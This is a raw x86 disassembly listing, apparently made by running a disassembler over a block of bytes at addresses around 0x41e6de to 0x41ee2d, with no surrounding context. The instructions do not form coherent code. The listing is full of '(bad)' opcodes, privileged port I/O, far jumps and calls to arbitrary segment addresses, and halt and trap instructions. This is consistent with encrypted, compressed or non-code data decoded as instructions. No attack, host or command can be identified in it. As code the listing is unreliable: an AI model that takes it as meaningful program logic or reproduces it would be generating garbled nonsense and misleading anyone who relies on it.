  41e6de:	jge    0x41e718
  41e6e0:	mov    ebp,0x113807c5
  41e6e5:	sub    BYTE PTR [eax+0x9],ah
  41e6e8:	mov    ah,0xb
  41e6ea:	add    eax,0x9e9ad092
  41e6ef:	dec    ebp
  41e6f0:	ja     0x41e686
  41e6f2:	xor    BYTE PTR [ecx+edx*4],dl
  41e6f5:	pop    esp
  41e6f6:	out    0xc2,al
  41e6f8:	inc    eax
  41e6f9:	xchg   esi,eax
  41e6fa:	push   ecx
  41e6fb:	inc    esp
  41e6fc:	mov    al,0x8e
  41e6fe:	(bad)  
  41e700:	mov    al,ds:0x1931397
  41e705:	cmc    
  41e706:	sub    eax,DWORD PTR [edi-0x47]
  41e709:	mov    ebx,0x69f31ebb
  41e70e:	outs   dx,BYTE PTR ds:[esi]
  41e70f:	repnz imul esp,ebp,0xffffffbc
  41e713:	enter  0xf9a9,0xbe
  41e717:	js     0x41e764
  41e719:	loop   0x41e6f2
  41e71b:	xor    eax,0x7fd028fe
  41e720:	or     eax,0x7f31ca0b
  41e725:	loopne 0x41e6ac
  41e727:	pop    esp
  41e728:	and    eax,0xf4bba991
  41e72d:	cmp    ebp,DWORD PTR [edi]
  41e72f:	(bad)  
  41e730:	xchg   ebp,eax
  41e731:	pop    es
  41e732:	fwait
  41e733:	jns    0x41e6ff
  41e735:	jmp    0xd5845e60
  41e73a:	loop   0x41e6c1
  41e73c:	inc    esp
  41e73d:	popf   
  41e73e:	int    0xf6
  41e740:	mov    BYTE PTR [ebx+ecx*4],bl
  41e743:	int3   
  41e744:	int    0x5f
  41e746:	in     eax,dx
  41e747:	cdq    
  41e748:	stos   BYTE PTR es:[edi],al
  41e749:	loope  0x41e727
  41e74b:	fcmovb st,st(1)
  41e74d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e74e:	or     ah,al
  41e750:	leave  
  41e751:	mov    ebx,0x73e045f3
  41e756:	and    BYTE PTR [edx],bl
  41e758:	mov    ds:0x3a039642,al
  41e75d:	int3   
  41e75e:	scas   al,BYTE PTR es:[edi]
  41e75f:	sub    eax,DWORD PTR [eax]
  41e761:	sbb    dl,BYTE PTR [ebx]
  41e763:	jle    0x41e75f
  41e765:	in     eax,0x1e
  41e767:	add    ebx,edx
  41e769:	or     BYTE PTR [ebp-0x44],bh
  41e76c:	leave  
  41e76d:	cld    
  41e76e:	mov    esi,0x25920ab1
  41e773:	mov    eax,0x21e672b6
  41e778:	jb     0x41e729
  41e77a:	enter  0xfe30,0xd9
  41e77e:	pop    esi
  41e77f:	xchg   ecx,eax
  41e780:	jp     0x41e758
  41e782:	add    DWORD PTR [ebx-0x17],esi
  41e785:	lock in eax,0xda
  41e788:	sub    DWORD PTR [esi],eax
  41e78a:	cmp    eax,0xfd6028e7
  41e78f:	shl    bh,cl
  41e791:	mov    gs,WORD PTR [ecx+0x4a]
  41e794:	push   edi
  41e795:	nop
  41e796:	and    DWORD PTR [esi+0x76c82c98],eax
  41e79c:	int    0xa8
  41e79e:	mov    dh,BYTE PTR [ebx-0x7bf2a592]
  41e7a4:	dec    edi
  41e7a5:	arpl   WORD PTR ds:0xd5e5c64e,cx
  41e7ab:	mov    esi,0x1d55b58
  41e7b0:	jne    0x41e773
  41e7b2:	pop    ebp
  41e7b3:	cmp    al,0x22
  41e7b5:	pop    ds
  41e7b6:	pop    ebx
  41e7b7:	inc    ebx
  41e7b8:	and    eax,0x8a52e083
  41e7bd:	pop    es
  41e7be:	loope  0x41e74c
  41e7c0:	(bad)  
  41e7c1:	jl     0x41e7c6
  41e7c3:	xchg   DWORD PTR [ecx],ecx
  41e7c5:	pop    eax
  41e7c6:	fdivr  DWORD PTR [eax]
  41e7c8:	xchg   edx,eax
  41e7c9:	cmc    
  41e7ca:	pushf  
  41e7cb:	jmp    0xacb70449
  41e7d0:	aam    0xf8
  41e7d2:	dec    edx
  41e7d3:	inc    edi
  41e7d4:	inc    eax
  41e7d5:	scas   al,BYTE PTR es:[edi]
  41e7d6:	add    eax,0xf59e031a
  41e7db:	xor    ah,BYTE PTR [ecx-0x543e96b0]
  41e7e1:	repnz stos DWORD PTR es:[edi],eax
  41e7e3:	(bad)  
  41e7e4:	mov    dl,0x3d
  41e7e6:	and    cl,BYTE PTR [edi+ecx*1+0x41ec68bd]
  41e7ed:	mov    ch,0x60
  41e7ef:	jp     0x41e816
  41e7f1:	dec    esp
  41e7f2:	lds    esi,FWORD PTR [ecx+edi*8-0x1d0780d2]
  41e7f9:	frstor [eax-0x3e479989]
  41e7ff:	ins    DWORD PTR es:[edi],dx
  41e800:	das    
  41e801:	test   al,0xcb
  41e803:	pushf  
  41e804:	mov    ch,BYTE PTR [ebx+esi*2-0xf]
  41e808:	rcr    DWORD PTR [edi-0x57],1
  41e80b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e80c:	ss inc ecx
  41e80e:	pop    ss
  41e80f:	aam    0x5e
  41e811:	(bad)  
  41e812:	(bad)  
  41e813:	(bad)  
  41e814:	adc    ecx,DWORD PTR [edi+edx*1-0x65]
  41e818:	into   
  41e819:	cmp    bl,BYTE PTR [edi+0xf]
  41e81c:	push   esp
  41e81d:	fnstsw WORD PTR [ebp-0x41d7b6f]
  41e823:	or     BYTE PTR [eax+ebx*2],ch
  41e826:	lahf   
  41e827:	mov    eax,0xcbabe075
  41e82c:	scas   al,BYTE PTR es:[edi]
  41e82d:	push   edi
  41e82e:	data16 rcr BYTE PTR [esi+esi*1-0x60],1
  41e833:	stos   DWORD PTR es:[edi],eax
  41e834:	mov    ah,0x7a
  41e836:	mov    edx,0xcab50d35
  41e83b:	sbb    DWORD PTR [edi-0x61],ecx
  41e83e:	mov    bl,0x62
  41e840:	test   DWORD PTR [eiz*4-0x55910c6d],esp
  41e847:	dec    ebp
  41e848:	mov    esi,0x691f852d
  41e84d:	xlat   BYTE PTR ds:[ebx]
  41e84e:	aam    0xcc
  41e850:	add    eax,0x72238ebf
  41e855:	pop    ds
  41e856:	jae    0x41e83a
  41e858:	pop    ecx
  41e859:	pop    eax
  41e85a:	je     0x41e818
  41e85c:	mov    ah,0xd7
  41e85e:	or     al,0x6c
  41e860:	dec    ebp
  41e861:	lahf   
  41e862:	loopne 0x41e811
  41e864:	cdq    
  41e865:	and    eax,0xa59538d0
  41e86a:	pop    ebp
  41e86b:	fld    st(2)
  41e86d:	and    ebx,ebx
  41e86f:	cmp    edx,DWORD PTR [eax]
  41e871:	test   al,0xfe
  41e873:	mov    eax,0xa19ba1b4
  41e878:	enter  0xac4b,0x5e
  41e87c:	pop    eax
  41e87d:	jmp    0x41e8a9
  41e87f:	add    eax,0xe760a045
  41e884:	dec    esp
  41e885:	mov    edx,0xc4821ee1
  41e88a:	add    eax,0xc33eb105
  41e88f:	push   edi
  41e890:	xor    edx,edi
  41e892:	ror    BYTE PTR [ebp+0x40],0xf9
  41e896:	data16 jp 0x41e840
  41e899:	clc    
  41e89a:	pop    ebp
  41e89b:	(bad)  
  41e89c:	xlat   BYTE PTR ds:[ebx]
  41e89d:	mov    ecx,0xfaae2cac
  41e8a2:	out    dx,al
  41e8a3:	cs cdq 
  41e8a5:	cmp    DWORD PTR [ecx],esp
  41e8a7:	and    esp,DWORD PTR [esi*1-0x2abcdda]
  41e8ae:	in     eax,0x2d
  41e8b0:	dec    ecx
  41e8b1:	dec    ebx
  41e8b2:	fs ins BYTE PTR es:[edi],dx
  41e8b4:	push   cs
  41e8b5:	ins    BYTE PTR es:[edi],dx
  41e8b6:	mov    ebp,0x3d03b126
  41e8bb:	mov    ch,0xb4
  41e8bd:	call   0xda335a8a
  41e8c2:	test   eax,0xe8fbb092
  41e8c7:	ficom  WORD PTR [eax+ecx*4]
  41e8ca:	jno    0x41e85b
  41e8cc:	fcomi  st,st(7)
  41e8ce:	js     0x41e853
  41e8d0:	fist   DWORD PTR [eax]
  41e8d2:	mov    ch,0x8e
  41e8d4:	not    DWORD PTR [eax+0x110de3ea]
  41e8da:	mov    ecx,0x9cfa0daa
  41e8df:	xchg   ebx,eax
  41e8e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8e1:	addr16 repz fs jno 0x41e8b7
  41e8e6:	adc    BYTE PTR [ebp-0x4],0x80
  41e8ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8eb:	sub    al,0x59
  41e8ed:	mov    dl,0x6
  41e8ef:	es pop esi
  41e8f1:	adc    edi,ecx
  41e8f3:	mov    ah,0xdb
  41e8f5:	sub    al,0xfb
  41e8f7:	ret    
  41e8f8:	mov    ebp,0x9ce645cb
  41e8fd:	mov    ?,WORD PTR [esi]
  41e8ff:	fisttp DWORD PTR [esi]
  41e901:	jns    0x41e8e9
  41e903:	(bad)  [ecx+ecx*4-0xe]
  41e907:	fmul   DWORD PTR [edx+0x6]
  41e90a:	aam    0x1f
  41e90c:	jno    0x41e92b
  41e90e:	dec    edi
  41e90f:	cmp    BYTE PTR [ebp+0x844aec1],bl
  41e915:	hlt    
  41e916:	leave  
  41e917:	test   BYTE PTR [edi],bl
  41e919:	loope  0x41e923
  41e91b:	fidiv  DWORD PTR [esi]
  41e91d:	adc    BYTE PTR [edi+0x4f9d618c],ch
  41e923:	xor    bl,ah
  41e925:	inc    ebp
  41e926:	mov    esp,0xd76d153b
  41e92b:	mov    bx,0x1b00
  41e92f:	push   es
  41e930:	sbb    BYTE PTR fs:[ecx-0x2f],al
  41e934:	popf   
  41e935:	inc    esp
  41e936:	mov    ah,0x1e
  41e938:	stc    
  41e939:	mov    dh,0x7c
  41e93b:	adc    bl,BYTE PTR [edx+ebp*2+0x36]
  41e93f:	jbe    0x41e994
  41e941:	push   edx
  41e942:	or     dl,cl
  41e944:	pop    es
  41e945:	jge    0x41e9c4
  41e947:	and    al,BYTE PTR [edx+0x1f]
  41e94a:	mov    dh,0xe8
  41e94c:	push   ebp
  41e94d:	call   0xaf16:0x905dfd67
  41e954:	inc    ecx
  41e955:	push   ds
  41e956:	push   ebx
  41e957:	mov    ecx,0x6ef85d5c
  41e95c:	or     bl,BYTE PTR [ecx-0x47de6bbd]
  41e962:	push   esi
  41e963:	xchg   ecx,eax
  41e964:	fs dec esp
  41e966:	jae    0x41e9ae
  41e968:	jmp    0xe66:0x9e5d3765
  41e96f:	stos   DWORD PTR es:[edi],eax
  41e970:	adc    edi,DWORD PTR [edx]
  41e972:	lds    ebp,FWORD PTR [ecx]
  41e974:	mov    dh,0x88
  41e976:	jp     0x41e9a9
  41e978:	iret   
  41e979:	add    al,0x8c
  41e97b:	jmp    DWORD PTR [ebx]
  41e97d:	ror    BYTE PTR [ecx],0xd9
  41e980:	mov    ebp,0x4fd310f1
  41e985:	and    eax,0x9ac66434
  41e98a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e98b:	daa    
  41e98c:	mov    dh,0xe4
  41e98e:	test   cl,dh
  41e990:	mov    dh,dh
  41e992:	mov    ds:0x2191b136,eax
  41e997:	icebp  
  41e998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e999:	fstp   DWORD PTR [eax+0x15]
  41e99c:	push   esi
  41e99d:	out    0xb1,eax
  41e99f:	or     DWORD PTR [ebp-0x2f74dc93],esi
  41e9a5:	ja     0x41e94e
  41e9a7:	hlt    
  41e9a8:	fucom  st(2)
  41e9aa:	jb     0x41ea26
  41e9ac:	inc    edx
  41e9ad:	add    edx,eax
  41e9af:	leave  
  41e9b0:	stos   BYTE PTR es:[edi],al
  41e9b1:	cmp    dh,BYTE PTR [ecx+0x59]
  41e9b4:	ficom  WORD PTR [edx]
  41e9b6:	leave  
  41e9b7:	inc    ebx
  41e9b8:	jno    0x41e9a6
  41e9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9bb:	jecxz  0x41e9ad
  41e9bd:	mov    ebx,0x62e0d591
  41e9c2:	jp     0x41e975
  41e9c4:	call   0xbdfa:0x3a6f4589
  41e9cb:	mov    esp,0x939e99be
  41e9d0:	jno    0x41ea35
  41e9d2:	jmp    0x61fdd10a
  41e9d7:	dec    esi
  41e9d8:	push   esp
  41e9d9:	sub    ah,BYTE PTR [esi]
  41e9db:	and    al,BYTE PTR es:[esi]
  41e9de:	out    dx,eax
  41e9df:	(bad)  
  41e9e0:	pushf  
  41e9e1:	jae    0x41e968
  41e9e3:	inc    ebp
  41e9e4:	sub    eax,0x93f48df2
  41e9e9:	fst    st(4)
  41e9eb:	mov    dh,0x9d
  41e9ed:	inc    esp
  41e9ee:	xchg   ebp,eax
  41e9ef:	mov    dl,BYTE PTR [ebx+0x6a]
  41e9f2:	das    
  41e9f3:	ds mov al,0xa
  41e9f6:	stc    
  41e9f7:	xchg   ebp,eax
  41e9f8:	loop   0x41ea78
  41e9fa:	(bad)  
  41e9fb:	call   0xf194d8d2
  41ea00:	lods   al,BYTE PTR ds:[esi]
  41ea01:	cmp    eax,0x847e912b
  41ea06:	jb     0x41e9f7
  41ea08:	cdq    
  41ea09:	std    
  41ea0a:	jne    0x41e9b9
  41ea0c:	sti    
  41ea0d:	je     0x41e9bb
  41ea0f:	enter  0x1157,0x70
  41ea13:	xchg   edx,eax
  41ea14:	xchg   ecx,eax
  41ea15:	adc    BYTE PTR fs:[edi],dl
  41ea18:	in     eax,0x96
  41ea1a:	(bad)  
  41ea1b:	(bad)  
  41ea1c:	pause  
  41ea1e:	call   0x89c:0xda9e10b9
  41ea25:	lods   eax,DWORD PTR ds:[esi]
  41ea26:	gs jo  0x41e9d5
  41ea29:	sub    eax,0xe9cafd4f
  41ea2e:	sbb    bh,BYTE PTR [edx+0x1cd45d2b]
  41ea34:	into   
  41ea35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea36:	mov    dh,0x13
  41ea38:	mul    DWORD PTR [esi-0x1]
  41ea3b:	and    BYTE PTR [ebp+0x55],0xf3
  41ea3f:	cld    
  41ea40:	pop    esp
  41ea41:	daa    
  41ea42:	fbstp  TBYTE PTR [ecx+0x4711cd45]
  41ea48:	sub    eax,0x6ed5d62a
  41ea4d:	pop    eax
  41ea4e:	imul   ebx,DWORD PTR [eax-0x5b],0xc6eedf37
  41ea55:	push   0xa74b2462
  41ea5a:	sbb    al,BYTE PTR [esi+0x4fce9f45]
  41ea60:	imul   esi,eax,0xb73b1b16
  41ea66:	xchg   BYTE PTR [ecx],dh
  41ea68:	das    
  41ea69:	xchg   esp,eax
  41ea6a:	mov    cl,0xf9
  41ea6c:	and    dh,dh
  41ea6e:	pushf  
  41ea6f:	jns    0x41ea40
  41ea71:	sar    BYTE PTR [esi+0x4653e44a],1
  41ea77:	lods   eax,DWORD PTR ds:[esi]
  41ea78:	ret    0x2894
  41ea7b:	test   eax,0xcec7bec5
  41ea80:	xchg   BYTE PTR [edx],ch
  41ea82:	dec    ebp
  41ea83:	in     al,0x69
  41ea85:	or     BYTE PTR [edx+0x1c],ah
  41ea88:	loopne 0x41ea5e
  41ea8a:	stos   DWORD PTR es:[edi],eax
  41ea8b:	xchg   edx,eax
  41ea8c:	sbb    DWORD PTR [ebx],edx
  41ea8e:	pusha  
  41ea8f:	fimul  DWORD PTR [ebp-0x7f]
  41ea92:	stc    
  41ea93:	or     al,0x3f
  41ea95:	mov    eax,ds:0x9a598459
  41ea9a:	inc    edx
  41ea9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea9c:	test   eax,0x2d90a7c7
  41eaa1:	cmp    al,0x9a
  41eaa3:	inc    ebx
  41eaa4:	arpl   WORD PTR [ebp+eax*4+0x26177c35],ax
  41eaab:	xchg   esp,eax
  41eaac:	(bad)  
  41eaad:	add    al,0xd2
  41eaaf:	bound  edi,QWORD PTR [edx]
  41eab1:	sahf   
  41eab2:	inc    edi
  41eab3:	cmp    dl,BYTE PTR [edx+0x278c3ea9]
  41eab9:	pop    ebp
  41eaba:	ret    0xab63
  41eabd:	pop    es
  41eabe:	pop    ss
  41eabf:	pop    ebp
  41eac0:	or     eax,0x288b9b87
  41eac5:	shr    BYTE PTR [esi+ecx*8],cl
  41eac8:	and    eax,0x1a332a09
  41eacd:	js     0x41eb06
  41eacf:	mov    cl,0x46
  41ead1:	mov    cl,0xd
  41ead3:	mov    bh,0xcd
  41ead5:	les    esi,FWORD PTR [ecx]
  41ead7:	ret    0x10d
  41eada:	cld    
  41eadb:	mov    al,ds:0x97547e3a
  41eae0:	mov    ds,WORD PTR [ebp-0x66]
  41eae3:	cmp    eax,eax
  41eae5:	push   eax
  41eae6:	js     0x41eb5c
  41eae8:	add    DWORD PTR [eax+0x2399fda5],esi
  41eaee:	dec    ebp
  41eaef:	push   ss
  41eaf0:	loop   0x41eb19
  41eaf2:	push   es
  41eaf3:	dec    edx
  41eaf4:	sahf   
  41eaf5:	retf   
  41eaf6:	cmp    eax,0x56bbb201
  41eafb:	mov    ds:0x2ef1c74b,eax
  41eb00:	jns    0x41eaae
  41eb02:	aad    0x52
  41eb04:	xchg   esi,eax
  41eb05:	pop    ebx
  41eb06:	test   eax,0xeb1f4a1b
  41eb0b:	dec    esp
  41eb0c:	pop    ebp
  41eb0d:	jg     0x41eadd
  41eb0f:	imul   esi,DWORD PTR [edx],0xffffffa9
  41eb12:	ret    0x6209
  41eb15:	jmp    0x18de4401
  41eb1a:	cs jb  0x41eac1
  41eb1d:	sar    bl,cl
  41eb1f:	mov    dh,0xb7
  41eb21:	fst    QWORD PTR ds:0xe406db0c
  41eb27:	rol    BYTE PTR [ebx],1
  41eb29:	jb     0x41eb35
  41eb2b:	lahf   
  41eb2c:	inc    eax
  41eb2d:	in     eax,dx
  41eb2e:	or     DWORD PTR [esi+0x5e],0x75
  41eb32:	pushf  
  41eb33:	test   eax,0xe82d4945
  41eb38:	mov    edx,0x1b41be2e
  41eb3d:	xor    eax,DWORD PTR [esi+0x2a]
  41eb40:	imul   edi,DWORD PTR [esi-0x73070cf3],0xffffffde
  41eb47:	js     0x41eae1
  41eb49:	mov    eax,ds:0xa129bac0
  41eb4e:	jne    0x41eb2d
  41eb50:	adc    al,BYTE PTR [edi-0x73]
  41eb53:	xchg   DWORD PTR [ebx],edx
  41eb55:	pop    es
  41eb56:	enter  0x8c2e,0x7c
  41eb5a:	imul   ebx,DWORD PTR [edx],0xc5a556cd
  41eb60:	outs   dx,DWORD PTR ds:[esi]
  41eb61:	sub    BYTE PTR [esi],0x3d
  41eb64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb65:	mov    eax,ds:0xaba841cc
  41eb6a:	imul   edi
  41eb6c:	sbb    ah,BYTE PTR gs:[eax+0xc]
  41eb70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb71:	and    al,0xf3
  41eb73:	out    0x6a,eax
  41eb75:	call   0x901f:0x91ddafae
  41eb7c:	lds    eax,FWORD PTR [edi]
  41eb7e:	pusha  
  41eb7f:	into   
  41eb80:	ret    
  41eb81:	ret    0x77fd
  41eb84:	xor    al,0xd1
  41eb86:	dec    edx
  41eb87:	sub    al,0xa2
  41eb89:	mov    ch,0x7c
  41eb8b:	sti    
  41eb8c:	jnp    0x41eb91
  41eb8e:	mov    cl,BYTE PTR [eax-0x59]
  41eb91:	jno    0x41eb9b
  41eb93:	add    ecx,DWORD PTR [ebp-0x41]
  41eb96:	xor    esi,ecx
  41eb98:	rol    cl,1
  41eb9a:	and    ah,BYTE PTR [eax-0x71]
  41eb9d:	xchg   edi,eax
  41eb9e:	xor    DWORD PTR [esi],edx
  41eba0:	mov    esi,0x313259c9
  41eba5:	inc    edx
  41eba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eba7:	sub    al,0x2c
  41eba9:	sbb    bh,al
  41ebab:	sub    al,0x87
  41ebad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebae:	mov    al,0xee
  41ebb0:	push   esp
  41ebb1:	and    dl,BYTE PTR [esi+0x19]
  41ebb4:	push   es
  41ebb5:	retf   
  41ebb6:	mov    al,0x46
  41ebb8:	fsub   QWORD PTR [di-0x693b]
  41ebbd:	imul   edi,DWORD PTR [eax],0x63
  41ebc0:	retf   0x66bb
  41ebc3:	imul   edx,DWORD PTR [eax-0x71baa907],0xffffffea
  41ebca:	push   es
  41ebcb:	mov    ds:0x24c79f94,eax
  41ebd0:	or     al,0x7d
  41ebd3:	jb     0x41ebf1
  41ebd5:	test   al,0x6e
  41ebd7:	aad    0x4f
  41ebd9:	add    al,ch
  41ebdb:	sbb    BYTE PTR [esi],dl
  41ebdd:	sbb    esp,DWORD PTR [ebx-0x5203ac5c]
  41ebe3:	pop    ss
  41ebe4:	mov    dl,0xa8
  41ebe6:	sti    
  41ebe7:	cmc    
  41ebe8:	scas   eax,DWORD PTR es:[edi]
  41ebe9:	push   edi
  41ebea:	cmp    BYTE PTR [ecx],0x1c
  41ebed:	test   eax,0xb0ccbdd6
  41ebf2:	hlt    
  41ebf3:	dec    DWORD PTR [edx+eax*1]
  41ebf6:	not    bh
  41ebf8:	dec    edx
  41ebf9:	sbb    DWORD PTR [ecx-0x61],0xffffffdf
  41ebfd:	push   ebp
  41ebfe:	je     0x41ebdf
  41ec00:	es sbb bl,dh
  41ec03:	inc    ecx
  41ec04:	add    al,0xce
  41ec06:	push   ds
  41ec07:	push   ds
  41ec08:	cli    
  41ec09:	div    BYTE PTR [edx]
  41ec0b:	inc    edi
  41ec0c:	cli    
  41ec0d:	lds    ebx,FWORD PTR [ebp+0x70]
  41ec10:	jbe    0x41ebbf
  41ec12:	push   ds
  41ec13:	dec    ebx
  41ec14:	fwait
  41ec15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec16:	test   BYTE PTR [esi+eiz*8-0x2b3d8895],cl
  41ec1d:	ret    0xa34f
  41ec20:	cmc    
  41ec21:	ins    DWORD PTR es:[edi],dx
  41ec22:	sbb    eax,0x57c437bf
  41ec27:	dec    ebx
  41ec28:	shl    DWORD PTR [edi+0x4b],0x12
  41ec2c:	sti    
  41ec2d:	cmp    edx,ebx
  41ec2f:	ins    DWORD PTR es:[edi],dx
  41ec30:	xor    esp,0x28e594bd
  41ec36:	mov    esp,0xa967f587
  41ec3b:	mov    eax,ds:0x8118ee2a
  41ec40:	(bad)  
  41ec41:	fisttp WORD PTR [eax+0x52ab5612]
  41ec47:	fiadd  DWORD PTR [ebp+0xb]
  41ec4a:	fabs   
  41ec4c:	mov    edi,0xffff4e41
  41ec51:	jmp    0x275f:0xff444360
  41ec58:	xchg   ah,ah
  41ec5a:	sbb    BYTE PTR [ebx-0x2a182cf9],0xe9
  41ec61:	adc    edx,esp
  41ec63:	lods   al,BYTE PTR ds:[esi]
  41ec64:	mov    bl,BYTE PTR [eax-0x29a8b1d8]
  41ec6a:	rol    BYTE PTR [edi*2+0x5aa58b3d],1
  41ec71:	mov    eax,0x68e5bedf
  41ec76:	xchg   BYTE PTR [edi],cl
  41ec78:	fidiv  WORD PTR [eax]
  41ec7a:	(bad)  
  41ec7d:	and    DWORD PTR [edx-0x3b51fa4],0x2e
  41ec84:	inc    ebp
  41ec85:	push   ecx
  41ec86:	mov    dl,0x70
  41ec88:	or     ah,cl
  41ec8a:	stos   BYTE PTR es:[edi],al
  41ec8b:	ret    0xf388
  41ec8e:	xor    BYTE PTR [ebp+ebp*8-0x4d],bh
  41ec92:	inc    edi
  41ec93:	inc    esi
  41ec94:	movsx  ebx,WORD PTR [eax+0xb7262f8]
  41ec9b:	clc    
  41ec9c:	das    
  41ec9d:	les    esp,FWORD PTR [esi-0x31]
  41eca0:	push   eax
  41eca1:	and    esp,DWORD PTR [edx-0x1b7cfc65]
  41eca7:	dec    edi
  41eca8:	scas   al,BYTE PTR es:[edi]
  41eca9:	or     bl,BYTE PTR [edx+0x37]
  41ecac:	or     al,0x93
  41ecae:	adc    eax,0x790155da
  41ecb3:	test   eax,0xd0b1b3b2
  41ecb8:	pop    ss
  41ecb9:	push   ecx
  41ecba:	adc    eax,0x2875efb1
  41ecbf:	fs test al,0x2d
  41ecc2:	in     al,0x55
  41ecc4:	daa    
  41ecc5:	out    dx,eax
  41ecc6:	push   ss
  41ecc7:	(bad)  
  41ecc8:	pop    esp
  41ecc9:	mov    eax,ds:0x8d116486
  41ecce:	and    eax,0xd2ebed3a
  41ecd3:	imul   esi,DWORD PTR [edi+0x1648d70c],0x72
  41ecda:	ret    
  41ecdb:	pop    ds
  41ecdc:	push   0xe18c7837
  41ece1:	sbb    DWORD PTR [esi+0x1e],esp
  41ece4:	mov    edi,0xdba4a1d3
  41ece9:	clc    
  41ecea:	dec    esi
  41eceb:	call   0xc56a:0x310c36dd
  41ecf2:	mov    dh,0xb4
  41ecf4:	cmp    bl,ch
  41ecf6:	cmp    ah,BYTE PTR [eax-0x7f]
  41ecf9:	data16 in al,0xe4
  41ecfc:	aaa    
  41ecfd:	dec    esp
  41ecfe:	shl    BYTE PTR ds:0x13013386,1
  41ed04:	stos   DWORD PTR es:[edi],eax
  41ed05:	bound  ebx,QWORD PTR [ebx-0x44]
  41ed08:	xor    ah,al
  41ed0a:	push   eax
  41ed0b:	dec    eax
  41ed0c:	int    0xd0
  41ed0e:	inc    ecx
  41ed0f:	sub    dl,cl
  41ed11:	pop    edx
  41ed12:	das    
  41ed13:	test   DWORD PTR [edx+0x746e55df],esi
  41ed19:	adc    ebx,DWORD PTR [edx+0x35]
  41ed1c:	jo     0x41ed1b
  41ed1e:	adc    al,0x5e
  41ed20:	dec    ecx
  41ed21:	(bad)  
  41ed22:	mov    esp,0xe46cf473
  41ed27:	repz in eax,dx
  41ed29:	jg     0x41ed46
  41ed2b:	mov    al,0x22
  41ed2d:	js     0x41ecfe
  41ed2f:	cld    
  41ed30:	bound  ebx,QWORD PTR [ebp-0x79]
  41ed33:	inc    eax
  41ed34:	ins    DWORD PTR es:[edi],dx
  41ed35:	cmp    DWORD PTR [ebp+0x3a],eax
  41ed38:	push   ebp
  41ed39:	add    dh,BYTE PTR [edi]
  41ed3b:	dec    eax
  41ed3c:	add    DWORD PTR [ecx-0x5e],esp
  41ed3f:	xchg   esp,eax
  41ed40:	fnstcw WORD PTR [edi]
  41ed42:	mov    ch,0xd2
  41ed44:	jmp    0xd764:0xe270312d
  41ed4b:	test   BYTE PTR [edi],al
  41ed4d:	in     al,dx
  41ed4e:	arpl   sp,bx
  41ed50:	pop    edx
  41ed51:	stos   DWORD PTR es:[edi],eax
  41ed52:	jmp    0x83f939cf
  41ed57:	sub    dh,BYTE PTR [edx]
  41ed59:	stc    
  41ed5a:	mov    ds:0x6b577a52,al
  41ed5f:	sub    BYTE PTR [edi+0x5e19408c],0x1d
  41ed66:	adc    eax,0xf3070d14
  41ed6b:	pop    edi
  41ed6c:	pop    ecx
  41ed6d:	in     al,dx
  41ed6e:	icebp  
  41ed6f:	push   0x61ad6351
  41ed74:	push   edx
  41ed75:	(bad)  
  41ed76:	sahf   
  41ed77:	add    eax,0x258d0ca5
  41ed7c:	std    
  41ed7d:	jmp    0x20d6dc88
  41ed82:	inc    eax
  41ed83:	not    esi
  41ed85:	mov    ebp,0xb4a63458
  41ed8a:	stc    
  41ed8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed8c:	inc    eax
  41ed8d:	loope  0x41ed5a
  41ed8f:	bswap  edx
  41ed91:	cld    
  41ed92:	push   0x4ae0ed60
  41ed97:	sub    ah,BYTE PTR [edi-0x65c79ee0]
  41ed9d:	mov    esp,0x9a9fbf2b
  41eda2:	stos   BYTE PTR es:[edi],al
  41eda3:	or     BYTE PTR [esi+ebx*1+0xf],ah
  41eda7:	mov    edi,0xb1f779a3
  41edac:	nop
  41edad:	and    bl,BYTE PTR [esi+0x32377db]
  41edb3:	jbe    0x41edec
  41edb5:	cs aad 0xa
  41edb8:	(bad)  
  41edb9:	out    dx,al
  41edba:	pusha  
  41edbb:	inc    edx
  41edbc:	add    eax,0x6849c535
  41edc1:	dec    BYTE PTR [eax]
  41edc3:	inc    eax
  41edc4:	mov    ah,0x29
  41edc6:	pushf  
  41edc7:	jae    0x41ee3d
  41edc9:	icebp  
  41edca:	mov    edi,0x5a5d6e8
  41edcf:	mov    esp,0xd358e0a
  41edd4:	xor    esi,DWORD PTR [edx+0x5]
  41edd7:	sub    cl,BYTE PTR [edi-0x44]
  41edda:	jg     0x41ed8e
  41eddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eddd:	or     BYTE PTR [edi+0x16c58e4f],dl
  41ede3:	js     0x41ed9f
  41ede5:	pop    ss
  41ede6:	mov    ch,0x54
  41ede8:	cmp    DWORD PTR [edi],esp
  41edea:	ret    
  41edeb:	add    BYTE PTR [edx],0x8f
  41edee:	jge    0x41edfb
  41edf0:	sahf   
  41edf1:	int3   
  41edf2:	jmp    0x41ee18
  41edf4:	jge    0x41ed82
  41edf6:	clc    
  41edf7:	mov    DWORD PTR [esi+0x40],esp
  41edfa:	fwait
  41edfb:	adc    ebx,esi
  41edfd:	inc    eax
  41edfe:	ror    BYTE PTR [esi],cl
  41ee00:	inc    esp
  41ee01:	inc    ecx
  41ee02:	dec    ebx
  41ee03:	rdpmc  
  41ee05:	add    eax,0x16ae77e5
  41ee0a:	mov    DWORD PTR [edx+ebp*4-0x23694c5e],esi
  41ee11:	lds    eax,FWORD PTR [ebx-0x4e]
  41ee14:	enter  0xd6b8,0x46
  41ee18:	rol    DWORD PTR [edx],0x9e
  41ee1b:	adc    eax,0xd812dfd1
  41ee20:	fs fwait
  41ee22:	inc    ecx
  41ee23:	pop    ecx
  41ee24:	cwde   
  41ee25:	mov    cl,0x81
  41ee27:	xchg   ebp,eax
  41ee28:	sub    eax,0x61db25a6
  41ee2d:	mov    DWORD PTR [ecx-0x38],edx
